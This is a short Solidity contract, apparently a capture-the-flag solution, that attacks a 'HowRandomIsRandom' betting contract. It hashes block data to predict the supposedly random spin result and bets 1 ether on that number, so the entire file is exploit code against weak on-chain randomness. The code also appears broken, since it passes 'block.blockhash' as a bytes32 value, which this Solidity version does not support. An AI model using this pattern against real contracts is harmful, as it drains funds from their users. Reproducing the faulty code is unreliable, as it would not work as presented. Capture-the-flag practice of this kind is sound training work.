// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "src/CTF3/HowRandomIsRandom.sol";

interface IHowRandomIsRandom {
    function spin(uint _bet) payable external;
}

contract Attacker {
    address howRandomIsRandomAddr;
    HowRandomIsRandom howRandomIsRandom;

    constructor (address payable _howRandomIsRandomAddr) {
        howRandomIsRandomAddr = _howRandomIsRandomAddr;
        howRandomIsRandom = HowRandomIsRandom(_howRandomIsRandomAddr);
    }

    function attack() payable public {
        uint num = rand(block.blockhash, 100);

        IHowRandomIsRandom(howRandomIsRandom).spin{value: 1 ether}(num);
    }

    function rand(bytes32 hashValue, uint max) pure private returns (uint256 result){
        return uint256(keccak256(abi.encodePacked(hashValue))) % max;
    }

    receive() external payable { }
}